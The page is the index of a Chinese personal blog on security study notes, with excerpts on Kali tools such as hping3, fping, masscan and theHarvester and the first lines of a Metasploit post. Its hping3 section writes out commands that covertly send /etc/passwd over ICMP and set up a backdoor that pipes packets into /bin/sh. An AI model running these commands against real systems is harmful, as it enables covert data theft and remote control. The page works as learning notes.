<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta property="og:type" content="website">
<meta property="og:title" content="Jlan&#39;s Little World">
<meta property="og:url" content="http://jlan.darkflow.top/index.html">
<meta property="og:site_name" content="Jlan&#39;s Little World">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Jlan">
<meta name="twitter:card" content="summary"><title>Jlan's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":false},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"å¤åˆ¶","copySuccess":"å¤åˆ¶æˆåŠŸ","copyError":"å¤åˆ¶å¤±è´¥"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">é¦–é¡µ</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">å½’æ¡£</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">æ ‡ç­¾</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">å‹é“¾</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">æœç´¢</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Jlan's Little World</div><div class="header-banner-info__subtitle">æ¬¢è¿æ¥å­¦ä¹ çŸ¥è¯†</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/c3fdf5d6.html">ç½‘ç»œå®‰å…¨åŸºç¡€ç½‘ç»œçŸ¥è¯†</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/c3fdf5d6.html" data-flag-title="ç½‘ç»œå®‰å…¨åŸºç¡€ç½‘ç»œçŸ¥è¯†"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/8b8ae737.html">Kaliä»0åˆ°1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-10-01</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/8b8ae737.html" data-flag-title="Kaliä»0åˆ°1"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å·¥å…·å¤§å…¨"   >
          <a href="#å·¥å…·å¤§å…¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å·¥å…·å¤§å…¨" class="headerlink" title="å·¥å…·å¤§å…¨"></a>å·¥å…·å¤§å…¨</h1>
      
        <h2 id="ä¿¡æ¯æ”¶é›†"   >
          <a href="#ä¿¡æ¯æ”¶é›†" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2>
      
        <h3 id="å­˜æ´»ä¸»æœºè¯†åˆ«"   >
          <a href="#å­˜æ´»ä¸»æœºè¯†åˆ«" class="heading-link"><i class="fas fa-link"></i></a><a href="#å­˜æ´»ä¸»æœºè¯†åˆ«" class="headerlink" title="å­˜æ´»ä¸»æœºè¯†åˆ«"></a>å­˜æ´»ä¸»æœºè¯†åˆ«</h3>
      <ul>
<li><p><strong>arping</strong>ï¼š</p>
<ul>
<li>ç±»ä¼¼äºpingï¼Œä¹Ÿæ˜¯ç”¨æ¥æ¢æµ‹å­˜æ´»çš„ï¼Œä¸è¿‡ä½¿ç”¨çš„arpåè®®ä¸æ˜¯ICMPåè®®ï¼Œæ‰€ä»¥åªèƒ½æ¢æµ‹å†…ç½‘ä¸èƒ½ç¢°å…¬ç½‘</li>
<li>-tå‚æ•°å¯ä»¥æ·»åŠ macåœ°å€ï¼Œæ¥ä¿è¯IPåœ°å€ç»‘å®šåˆ°äº†æŒ‡å®šçš„MACåœ°å€ä¸Š</li>
<li>è¿˜è¡Œå§ï¼Œå¯èƒ½pingä¸ç®¡ç”¨çš„æ—¶å€™å¯ä»¥ç”¨ï¼Œå“¦è¿˜å¯ä»¥ç”¨æ¥æmacåœ°å€</li>
</ul>
</li>
<li><p><strong>fping</strong>ï¼š</p>
<ul>
<li><p>pingçš„åŠ å¼ºç‰ˆï¼Œfpingå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šè¦pingçš„ä¸»æœºèŒƒå›´</p>
</li>
<li><p>ä¸pingè¦ç­‰å¾…æŸä¸€ä¸»æœºè¿æ¥è¶…æ—¶æˆ–å‘å›åé¦ˆä¿¡æ¯ä¸åŒï¼Œfpingç»™ä¸€ä¸ªä¸»æœºå‘é€å®Œæ•°æ®åŒ…åï¼Œé©¬ä¸Šç»™ä¸‹ä¸€ä¸ªä¸»æœºå‘é€æ•°æ®åŒ…ï¼Œå®ç°å¤šä¸»æœºåŒæ—¶pingã€‚å¦‚æœæŸä¸€ä¸»æœºpingé€šï¼Œåˆ™æ­¤ä¸»æœºå°†è¢«æ‰“ä¸Šæ ‡è®°ï¼Œå¹¶ä»ç­‰å¾…åˆ—è¡¨ä¸­ç§»é™¤ï¼Œå¦‚æœæ²¡pingé€šï¼Œè¯´æ˜ä¸»æœºæ— æ³•åˆ°è¾¾ï¼Œä¸»æœºä»ç„¶ç•™åœ¨ç­‰å¾…åˆ—è¡¨ä¸­ï¼Œç­‰å¾…åç»­æ“ä½œã€‚</p>
</li>
<li><p>```shell<br>fping IP1 IP2 IP3 â€¦<br>fping -f filename<br>fping -g IP1 IP2<br>å¯ä»¥æ·»åŠ -aå‚æ•°æ¥åªæ˜¾ç¤ºå­˜æ´»ä¸»æœº</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - pingçš„å‡çº§ç‰ˆï¼ˆè‡ªå·±å†™æ­Œè„šæœ¬è²Œä¼¼ä¹Ÿå·®ä¸å¤šï¼‰</span><br><span class="line"></span><br><span class="line">- **hping3**ï¼š</span><br><span class="line"></span><br><span class="line">  - hpingæ˜¯å®‰å…¨å®¡è®¡ã€é˜²ç«å¢™æµ‹è¯•ç­‰å·¥ä½œçš„æ ‡é…å·¥å…·ã€‚hpingä¼˜åŠ¿åœ¨äºèƒ½å¤Ÿå®šåˆ¶æ•°æ®åŒ…çš„å„ä¸ªéƒ¨åˆ†ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥çµæ´»å¯¹ç›®æ ‡æœºè¿›è¡Œç»†è‡´åœ°æ¢æµ‹ã€‚</span><br><span class="line"></span><br><span class="line">  - å¯ä»¥è‡ªå·±å®šåˆ¶æ•°æ®åŒ…æ¥æ¢æµ‹é˜²ç«å¢™ï¼Œä¹Ÿå¯ä»¥è¯¦ç»†æŸ¥çœ‹å“åº”æ¥åˆ¤æ–­æ‹¦æˆªç­‰å†…å®¹ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥ä¼ªé€ ICMPåŒ…æ¥æ‰“DDOS</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    -a æŒ‡å®šåŒ…çš„è¯·æ±‚IPï¼Œå¯ä»¥æŒ‡å®šä¸ºç›®æ ‡æ¥è®©è‡ªå·±åå¤pingè‡ªå·±ï¼Œä¸è¿‡è¿™æ ·çš„è¯è‡ªå·±ä¹Ÿå°±æ”¶ä¸åˆ°å“åº”æ•°æ®äº†</span><br><span class="line">    -p æŒ‡å®šç«¯å£</span><br><span class="line">    -I æŒ‡å®šç½‘å¡</span><br><span class="line">    -c æŒ‡å®šå‘åŒ…æ¬¡æ•°</span><br></pre></td></tr></table></div></figure></li>
<li><p><strong>æ–‡ä»¶ä¼ è¾“</strong></p>
<ul>
<li><p>Hping3æ”¯æŒé€šè¿‡TCP/UDP/ICMPç­‰åŒ…æ¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚ç›¸å½“äºå€ŸåŠ©TCP/UDP/ICMPåŒ…å»ºç«‹éšç§˜éš§é“é€šè®¯ã€‚å®ç°æ–¹å¼æ˜¯å¼€å¯ç›‘å¬ç«¯å£ï¼Œå¯¹æ£€æµ‹åˆ°çš„ç­¾åï¼ˆç­¾åä¸ºç”¨æˆ·æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼‰çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§£æã€‚åœ¨æ¥æ”¶ç«¯å¼€å¯æœåŠ¡ï¼š</p>
</li>
<li><p>```shell<br>hping3 æºIP â€“listen signature â€“safe  â€“icmp</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ç›‘å¬ICMPåŒ…ä¸­çš„ç­¾åï¼Œæ ¹æ®ç­¾åè§£æå‡ºæ–‡ä»¶å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">- åœ¨å‘é€ç«¯ä½¿ç”¨ç­¾åæ‰“åŒ…çš„ICMPåŒ…å‘é€æ–‡ä»¶ï¼š</span><br><span class="line"></span><br><span class="line">- ```shell</span><br><span class="line">  hping3 ç›®æ ‡IP --icmp -d 100 --sign signature --file /etc/passwd</span><br></pre></td></tr></table></div></figure></li>
<li><p>å°†<code>/etc/passwd</code>å¯†ç æ–‡ä»¶é€šè¿‡ICMPåŒ…ä¼ ç»™ç›®æ ‡ä¸»æœºã€‚å‘é€åŒ…å¤§å°ä¸º100å­—èŠ‚ï¼ˆ-d 100ï¼‰ï¼Œå‘é€ç­¾åä¸ºsignature(-sign signature)ã€‚</p>
</li>
</ul>
</li>
<li><p><strong>åå¼¹shellåŠŸèƒ½</strong></p>
<ul>
<li><p>å¦‚æœHping3èƒ½å¤Ÿåœ¨è¿œç¨‹ä¸»æœºä¸Šå¯åŠ¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½œä¸ºæœ¨é©¬ç¨‹åºå¯åŠ¨ç›‘å¬ç«¯å£ï¼Œå¹¶åœ¨å»ºç«‹è¿æ¥åæ‰“å¼€shellé€šä¿¡ã€‚ä¸netcatçš„åé—¨åŠŸèƒ½ç±»ä¼¼ã€‚</p>
</li>
<li><p>ç¤ºä¾‹ï¼šæœ¬åœ°æ‰“å¼€53å·UDPç«¯å£ï¼ˆDNSè§£ææœåŠ¡ï¼‰ç›‘å¬æ¥è‡ª192.168.10.66ä¸»æœºçš„åŒ…å«ç­¾åä¸ºsignatureçš„æ•°æ®åŒ…ï¼Œå¹¶å°†æ”¶åˆ°çš„æ•°æ®è°ƒç”¨/bin/shæ‰§è¡Œã€‚</p>
</li>
<li><p>åœ¨æœ¨é©¬å¯åŠ¨ç«¯ï¼š</p>
</li>
<li><p>```<br>hping3 192.168.10.66â€“listen signature â€“safe â€“udp -p 53 | /bin/sh</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- åœ¨è¿œç¨‹æ§åˆ¶ç«¯ï¼š</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span><br></pre></td></tr></table></div></figure></li>
<li><p>å°†åŒ…å«lså‘½ä»¤çš„æ–‡ä»¶åŠ ä¸Šç­¾åsignatureå‘é€åˆ°192.168.10.44ä¸»æœºçš„53å·UDPç«¯å£ï¼ŒåŒ…æ•°æ®é•¿åº¦ä¸º100å­—èŠ‚ã€‚</p>
</li>
<li><p>å½“ç„¶è¿™é‡Œåªæ˜¯ç®€å•çš„æ¼”ç¤ºç¨‹åºï¼ŒçœŸå®çš„åœºæ™¯ï¼Œæ§åˆ¶ç«¯å¯ä»¥åˆ©ç›Šshellæ‰§è¡Œå¾ˆå¤šçš„é«˜çº§å¤æ‚çš„æ“ä½œã€‚</p>
</li>
</ul>
</li>
<li><p>å¥½é«˜çº§çš„è¯´ï¼Œå¯ä»¥è‡ªå®šä¹‰çš„éƒ¨åˆ†ä¹Ÿå¾ˆå¤šï¼Œä¹Ÿæœ‰ä¸€äº›æœ‰è¶£çš„åº”ç”¨ï¼Œå¯å†²</p>
</li>
</ul>
</li>
<li><p><strong>masscan</strong>ï¼š</p>
<ul>
<li><p>åˆä¸€ä¸ªæ‰«æå·¥å…·ï¼Œç»™ä¸ªä¾‹å­å°±è¿‡ï¼Œå¥½å¿«å•Š</p>
</li>
<li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>ï¼ˆæ‰«æ10.x.x.xå­ç½‘ï¼Œæ‰«æç«¯å£80å’Œ8000-8100èŒƒå›´çš„ç«¯å£æ®µï¼‰<br>å¯ä½¿ç”¨â€“echoæŠŠå½“å‰é…ç½®è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œ-cä½¿ç”¨æ–‡ä»¶<br>â€“source-ip æŒ‡å®šæºIP<br>â€“excludefile æ–‡ä»¶ æŒ‡å®šç½‘æ®µå¿½ç•¥<br>â€“max-rate 100000 æœ€é«˜å‘åŒ…é€Ÿç‡<br>â€“banners è·å–bannerä¿¡æ¯ï¼Œæ”¯æŒå°‘é‡çš„åè®®</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - mdä½ å¿«æœ‰ä¸ªåµå­ç”¨ï¼Œæ‰«ä¸å‡ºæ¥ç«¯å£å­˜æ´»ä¿¡æ¯å•Š</span><br><span class="line"></span><br><span class="line">- **thcping6**ï¼š</span><br><span class="line"></span><br><span class="line">  - é’ˆå¯¹IPV6çš„å‘åŒ…å·¥å…·ï¼Œéš¶å±äºatk6è¿™ä¸ªè¿™ä¸ªå·¥å…·åŒ…ä¸‹ï¼Œå®˜æ–¹æè¿°æ˜¯sends a hand crafted ping6 packetï¼Œå°±æ˜¯æ‰‹åŠ¨æ„é€ ä¸€ä¸ªping6çš„æ•°æ®åŒ…</span><br><span class="line">  - å­¦äº†IPV6å†æ¥</span><br><span class="line"></span><br><span class="line">### è·¯ç”±åˆ†æ</span><br><span class="line"></span><br><span class="line">- **netdiscover**ï¼š</span><br><span class="line">  </span><br><span class="line">  - äºŒå±‚å‘ç°å·¥å…·ï¼Œæ‹¥æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨å‘ç°ä¸¤ç§æ–¹å¼ï¼Œé€šè¿‡ARPè·¯ç”±è¡¨æ¢æµ‹</span><br><span class="line">  - æœ€ç®€å•çš„å°±æ˜¯ç›´æ¥è¾“å…¥netdiscoverä¹‹åå°±æ˜¯è¿è¡Œå®ƒçš„é»˜è®¤é…ç½®ç„¶åæ‰«æå±€åŸŸç½‘ä¸­æ‰€æœ‰çš„æœºå™¨</span><br><span class="line">  - ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥ç½‘å¡è®©ä»–è‡ªå·±è·‘ä¸¤å±‚</span><br><span class="line">  - æ¯å¤©ä¸€ä¸ªè¢«æ‰“ç”µè¯å°æŠ€å·§</span><br><span class="line">  </span><br><span class="line">- **netmask**ï¼š</span><br><span class="line"></span><br><span class="line">  - netmakså¯ä»¥åœ¨ IPèŒƒå›´ã€å­ç½‘æ©ç ã€cidrã€ciscoç­‰æ ¼å¼ä¸­äº’ç›¸è½¬æ¢ï¼Œå¹¶ä¸”æä¾›äº†IPåœ°å€çš„ç‚¹åˆ†åè¿›åˆ¶ã€16è¿›åˆ¶ã€8è¿›åˆ¶ã€2è¿›åˆ¶ä¹‹é—´çš„äº’ç›¸è½¬æ¢</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    Usage: netmask spec [spec ...]</span><br><span class="line">      -h, --help                    Print a summary of the options</span><br><span class="line">      -v, --version                 Print the version number</span><br><span class="line">      -d, --debug                   Print status/progress information</span><br><span class="line">      -s, --standard                Output address/netmask pairs</span><br><span class="line">      -c, --cidr                    Output CIDR format address lists</span><br><span class="line">      -i, --cisco                   Output Cisco style address lists</span><br><span class="line">      -r, --range                   Output ip address ranges</span><br><span class="line">      -x, --hex                     Output address/netmask pairs in hex</span><br><span class="line">      -o, --octal                   Output address/netmask pairs in octal</span><br><span class="line">      -b, --binary                  Output address/netmask pairs in binary</span><br><span class="line">      -n, --nodns                   Disable DNS lookups for addresses</span><br><span class="line">      -f, --files                   Treat arguments as input files</span><br><span class="line">    Definitions:</span><br><span class="line">      a spec can be any of:</span><br><span class="line">        address</span><br><span class="line">        address:address</span><br><span class="line">        address:+address</span><br><span class="line">        address/mask</span><br><span class="line">      an address can be any of:</span><br><span class="line">        N           decimal number</span><br><span class="line">        0N          octal number</span><br><span class="line">        0xN         hex number</span><br><span class="line">        N.N.N.N     dotted quad</span><br><span class="line">        hostname    dns domain name</span><br><span class="line">      a mask is the number of bits set to one from the left</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¿™ä¸ªçœ‹å®˜æ–¹æ–‡æ¡£å§</p>
</li>
</ul>
</li>
</ul>

        <h3 id="æƒ…æŠ¥åˆ†æ"   >
          <a href="#æƒ…æŠ¥åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æƒ…æŠ¥åˆ†æ" class="headerlink" title="æƒ…æŠ¥åˆ†æ"></a>æƒ…æŠ¥åˆ†æ</h3>
      <ul>
<li><p><strong>spiderfoot</strong>ï¼š</p>
<ul>
<li>ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨è¿›è¡Œå¤§é‡æŸ¥è¯¢çš„å·¥å…·</li>
<li>å¯åŠ¨éœ€è¦æŒ‡å®šå¥½ç›‘å¬çš„IPå’Œç«¯å£ï¼Œç„¶åæµè§ˆå™¨ç›´æ¥è®¿é—®å°±è¡Œå•¦</li>
<li>å¥½ç”¨çš„è€¶ï¼Œä¸€äº›èµ„äº§æœå¯»ä¸ç”¨æ‰‹åŠ¨åšäº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ²¡äº‹æœæœè‡ªå·±æ¥ä¿æŠ¤è‡ªå·±</li>
</ul>
</li>
<li><p><strong>theHarvester</strong>ï¼š</p>
<ul>
<li><p>è¿™ä¸ªå˜›å°±æ˜¯ä¸€ä¸ªæ‰‹åŠ¨çš„æœç´¢å·¥å…·å•¦ï¼Œç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£å°±å¥½</p>
</li>
<li><pre><code>-d    --domain                    è¦æœç´¢çš„å…¬å¸åç§°æˆ–åŸŸåã€‚
-l    --limit                        é™åˆ¶æœç´¢ç»“æœçš„æ•°é‡ï¼Œé»˜è®¤=500ã€‚
-S    --start                        ä»ç»“æœç¼–å· X å¼€å§‹ï¼Œé»˜è®¤ = 0ã€‚
-g    --google-dork            ä½¿ç”¨ Google Dorks è¿›è¡Œ Google æœç´¢ã€‚
-p    --proxies                    å¯¹è¯·æ±‚ä½¿ç”¨ä»£ç†ï¼Œåœ¨ proxies.yaml ä¸­è¾“å…¥ä»£ç†
-s    --shodan                    ä½¿ç”¨ Shodan æŸ¥è¯¢å‘ç°çš„ä¸»æœºã€‚
--screenshot                    å¯¹å·²è§£æçš„åŸŸè¿›è¡Œæˆªå›¾ï¼ŒæŒ‡å®šè¾“å‡ºç›®å½•ï¼š--screenshot output_directory
-v    --virtual-host        é€šè¿‡ DNS è§£æéªŒè¯ä¸»æœºåå¹¶æœç´¢è™šæ‹Ÿä¸»æœºã€‚
-e    --dns-server            ç”¨äºæŸ¥æ‰¾çš„ DNS æœåŠ¡å™¨ã€‚
-f    --filename                å°†ç»“æœä¿å­˜åˆ° XML å’Œ JSON æ–‡ä»¶ã€‚
-b    --source                    æŒ‡å®šæœç´¢çš„å¼•æ“å’Œæ•°æ®æº

#theHarvester -d [url] -l 300 -b [æœç´¢å¼•æ“åç§°]
</code></pre>
</li>
<li><p>æ²¡ä¸Šä¸€ä¸ªè‡ªåŠ¨åŒ–çš„å¥½ç”¨ï¼Œä¸å¼€å¿ƒğŸ˜’</p>
</li>
</ul>
</li>
</ul>

        <h2 id="æ¼æ´åˆ†æ"   >
          <a href="#æ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2>
      
        <h2 id="Webç¨‹åº"   >
          <a href="#Webç¨‹åº" class="heading-link"><i class="fas fa-link"></i></a><a href="#Webç¨‹åº" class="headerlink" title="Webç¨‹åº"></a>Webç¨‹åº</h2>
      
        <h2 id="æ•°æ®åº“è¯„ä¼°è½¯ä»¶"   >
          <a href="#æ•°æ®åº“è¯„ä¼°è½¯ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ•°æ®åº“è¯„ä¼°è½¯ä»¶" class="headerlink" title="æ•°æ®åº“è¯„ä¼°è½¯ä»¶"></a>æ•°æ®åº“è¯„ä¼°è½¯ä»¶</h2>
      
        <h2 id="å¯†ç æ”»å‡»"   >
          <a href="#å¯†ç æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¯†ç æ”»å‡»" class="headerlink" title="å¯†ç æ”»å‡»"></a>å¯†ç æ”»å‡»</h2>
      
        <h2 id="æ— çº¿æ”»å‡»"   >
          <a href="#æ— çº¿æ”»å‡»" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ— çº¿æ”»å‡»" class="headerlink" title="æ— çº¿æ”»å‡»"></a>æ— çº¿æ”»å‡»</h2>
      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/ae2834af.html">msfä»0åˆ°0</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-09-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-09-28</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/ae2834af.html" data-flag-title="msfä»0åˆ°0"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="MSF"   >
          <a href="#MSF" class="heading-link"><i class="fas fa-link"></i></a><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1>
      
        <h2 id="åŸºç¡€ä½¿ç”¨"   >
          <a href="#åŸºç¡€ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸºç¡€ä½¿ç”¨" class="headerlink" title="åŸºç¡€ä½¿ç”¨"></a>åŸºç¡€ä½¿ç”¨</h2>
      <p>åŸºç¡€ä½¿ç”¨åˆ†ä¸ºå¦‚ä¸‹å‡ æ­¥ï¼š</p>
<ol>
<li>æŸ¥æ‰¾æ¼æ´</li>
<li>ä½¿ç”¨æ¼æ´</li>
<li>æŸ¥çœ‹æ¼æ´ä½¿ç”¨å‚æ•°</li>
<li>å¡«å†™å¯¹åº”å‚æ•°</li>
<li>å‘èµ·æ”»å‡»</li>
</ol>
